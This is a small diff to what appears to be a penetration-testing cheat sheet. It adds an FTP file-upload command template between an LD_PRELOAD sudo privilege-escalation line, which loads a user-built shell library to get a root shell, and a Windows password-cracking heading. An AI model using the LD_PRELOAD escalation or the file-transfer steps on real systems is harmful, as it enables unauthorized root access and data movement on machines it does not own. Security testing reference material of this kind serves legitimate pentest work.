@@ -1006,6 +1006,10 @@ start it with
 
     sudo LD_PRELOAD=/home/USER/shell.so <something that can be executed as sudo e.g. apache2>
 
+*FTP push file*
+
+    ftp-upload -h {HOST} -u {USERNAME} --password {PASSWORD} -d {SERVER_DIRECTORY} {FILE_TO_UPLOAD}
+
 
 **Windows PW Cracking**
 
